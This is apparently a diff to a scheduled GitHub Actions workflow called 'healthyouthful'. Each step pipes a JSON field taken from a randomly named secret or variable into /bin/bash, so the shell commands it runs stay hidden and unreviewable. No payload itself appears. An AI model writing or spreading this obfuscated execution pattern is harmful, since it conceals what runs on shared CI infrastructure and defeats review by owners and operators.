@@ -1,21 +1,24 @@
 name: healthyouthful
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 5/6 * * *'
-jobs:  # 17771
+    - cron: '34 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: healthyouthful
         env:
-          hug82493: ${{ secrets.hug82493 }}
+          uqanf0: ${{ secrets.uqanf0 }}
         run: |
-          echo $hug82493 | jq -r .d4900 | /bin/bash
-          echo $judjx401 | jq -r .nw6 | /bin/bash
-          echo $luegx55 | jq -r .wg4 | /bin/bash
-          echo $bfzj99294 | jq -r .njpo7 | /bin/bash
-          echo $hnu58797 | jq -r .urp52734 | /bin/bash
-          echo $nvann74 | jq -r .l6842 | /bin/bash
+          echo $uqanf0 | jq -r .jw7 | /bin/bash
+          echo $xcbzv2 | jq -r .js59634 | /bin/bash
+          echo $eger886 | jq -r .zqhx5 | /bin/bash
+          echo $j6 | jq -r .lapd46015 | /bin/bash
+          echo $x46987 | jq -r .prka425 | /bin/bash
+          echo $uuv99 | jq -r .jw1092 | /bin/bash
+          echo $nwreq11413 | jq -r .d2 | /bin/bash
 
